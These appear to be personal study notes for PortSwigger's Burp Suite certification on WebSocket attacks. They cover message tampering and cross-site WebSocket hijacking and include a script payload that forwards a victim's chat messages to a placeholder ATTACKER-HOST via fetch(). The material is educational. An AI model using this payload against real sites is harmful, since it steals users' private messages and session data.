##### PortSwigger BurpSuite Certification Summary
# Websockets
Sometimes it is useful to alter the messages sent via web sockets. This can circumvent certain checks and enable even more control over the traffic.

Noteworthy is that the handshake to initiate a session uses a Sec-WebSocket-Key which is a Base64-encoded random string. When trying to reconnect to a session, this string should be altered!

## Cross-site WebSocket hijacking
If the conditions for CSRF are met and websockets are in use, it offers an additional attack surface. In contrast to traditional CSRF, websockets enable a two-way communication which makes it possible for the attacker to read along with everything that is sent. A payload looks like this:
```
<script>
    var ws = new WebSocket('wss://VICTIM-HOST/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://ATTACKER-HOST', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```
The response, in this case the chat history, can be fetched with and sent to an attacker controlled host, such as the collaborator.